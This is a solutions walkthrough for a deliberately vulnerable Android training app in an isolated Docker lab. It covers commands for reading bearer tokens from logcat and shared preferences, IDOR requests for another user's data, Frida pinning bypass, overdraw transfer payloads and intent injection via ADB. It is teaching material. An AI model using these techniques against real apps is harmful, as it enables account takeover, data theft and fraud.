Solutions for all seven Home Lab exercises. Try the progressive hints first, then review the full walkthroughs at your own pace.

For the isolated Docker Home Lab only. Replace <YOUR_BEARER_TOKEN> with your current token from Mockapp. The example commands do not use a real, reusable session token.

EXERCISE 1 — Static Android analysis

Open AndroidManifest.xml in JADX-GUI. Observe the exported launcher activity:

<activity
    android:name="com.mockapp.loyalty.DashboardActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>

exported="true" allows an external app to launch this activity. Exported launchers are normal; the vulnerability appears when the activity trusts caller-controlled extras without authorization or confirmation.

EXERCISE 2 — Local data and logs

Start monitoring the authentication log tag in your terminal before signing in:

adb shell logcat -s MockappAuth:D '*:S'

Now sign in as Alice (or sign out and sign in again). The authentication log entry will appear:

Log in successfully. Look for the MockappAuth message, similar to:

D MockappAuth: Authentication succeeded, bearer token=<YOUR_BEARER_TOKEN>

The other exposure is a plaintext session preference. On the workshop's debuggable APK, run:

adb shell run-as com.mockapp.loyalty cat /data/data/com.mockapp.loyalty/shared_prefs/mockapp_session.xml

To find the relevant source in JADX-GUI: inspect LoginActivity and locate the Log.d call for MockappAuth, then inspect SessionStore for the SharedPreferences write.

Logcat and SharedPreferences both expose the same kind of sensitive credential. run-as works here because this APK is debuggable; it does not generally grant access to a non-debuggable production app.

EXERCISE 3 — Hidden diagnostics

Launch the exported activity using ADB:

adb shell am start -n com.mockapp.loyalty/.DiagnosticsActivity

Check what is displayed and whether an external caller can open it. The presence of diagnostics alone is not necessarily a vulnerability; the exposure of sensitive session data is.

EXERCISE 5 — Authorization (BOLA / IDOR)

In Burp → Proxy → HTTP history, right-click your authenticated GET /api/v1/me request and choose Send to Repeater (Ctrl+R). In Repeater, change the request path and send these requests with your own valid Bearer token and check whether another user's records are returned.

1 — Read Bob's user profile (ID 1043)

GET /api/v1/users/1043 HTTP/1.1
Accept: application/json
Authorization: Bearer <YOUR_BEARER_TOKEN>
User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; Android SDK built for x86_64 Build/UE1A.230829.036.A1)
Host: 10.0.2.2:8000
Connection: keep-alive
Accept-Encoding: gzip, deflate, br

2 — Read Bob's transaction history

GET /api/v1/users/1043/transactions HTTP/1.1
Accept: application/json
Authorization: Bearer <YOUR_BEARER_TOKEN>
User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; Android SDK built for x86_64 Build/UE1A.230829.036.A1)
Host: 10.0.2.2:8000
Connection: keep-alive
Accept-Encoding: gzip, deflate, br

Expected vulnerability: the server checks for a logged-in user but fails to verify ownership of the requested account or transaction history.

EXERCISE 4 — HTTP, HTTPS, and certificate pinning

In Burp, import the supplied project settings JSON, verify the listener runs on 127.0.0.1:8088 with destination redirection to 127.0.0.1, then browse to the provided custom .p12 under the listener Certificate settings.

Push lab-ca.crt into Android and install it as a user CA. Configure the Android Wi-Fi network proxy to 10.0.2.2:8088 (not the emulator Extended Controls upstream proxy).

In Mockapp's ⚗ Lab Testing menu, test HTTP, HTTPS and HTTPS + Pinning in order. Force-stop and restart after each change. HTTP/HTTPS should be interceptable, while the pinned mode should fail until Frida changes the custom pin-verification decision.

adb shell am force-stop com.mockapp.loyalty
frida -U -l ./bypass-mockapp-pinning.js -f com.mockapp.loyalty

In JADX-GUI inspect WorkshopPinVerifier.isPinned and the calling code in ApiClient. The Frida hook changes the pin decision without disabling TLS hostname checks or CA validation. See Setup for installing Frida Server.

EXERCISE 6 — Weak point transfer validation

Log in as Alice, transfer a small positive number of points to Bob, then find the POST /api/v1/transfers request in Burp's HTTP history. Right-click → Send to Repeater.

Change the JSON to an amount greater than Alice's available balance, retaining her Bearer token:

{"to_user":"bob","points":10000}

Send the request. The server wrongly accepts the transfer and can make Alice's balance negative while crediting Bob. In the backend source, inspect the transfer endpoint to confirm that it checks positive quantity and destination but omits a sufficient-funds check.

Reset the Docker Home Lab if you want to restore starting balances.

FINAL CHALLENGE — CUPCAKE

The transfer endpoint does not verify that the sender has enough points. With a valid sender's Bearer token, transfer points to another workshop account:

POST /api/v1/transfers HTTP/1.1
Accept: application/json
Authorization: Bearer <YOUR_BEARER_TOKEN>
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; Android SDK built for x86_64 Build/UE1A.230829.036.A1)
Host: 10.0.2.2:8000
Connection: keep-alive
Accept-Encoding: gzip, deflate, br

{"to_user":"your_user","points":123}

Replace your_user with a real different registered workshop username. Try a larger positive points value to see the missing balance check. Burp will calculate Content-Length; do not hard-code an incorrect value.

A separate app could trigger the same vulnerable flow by launching the exported Dashboard activity with crafted Intent extras. Simulate that with ADB while logged in to Mockapp:

adb shell am start -n com.mockapp.loyalty/.DashboardActivity --es transfer_to_user your_user --ei transfer_points 10000 --ez auto_send true

Why it works: the app trusts the caller-controlled auto_send and transfer extras, bypassing the normal confirmation step. The API separately permits transfers that make the sender's balance negative. Log in as Bob after the 10,000-point transfer; his balance is enough to redeem the 9,999-point virtual cupcake.

All activities are intentionally vulnerable and should only be tested in your local Mockapp Home Lab.
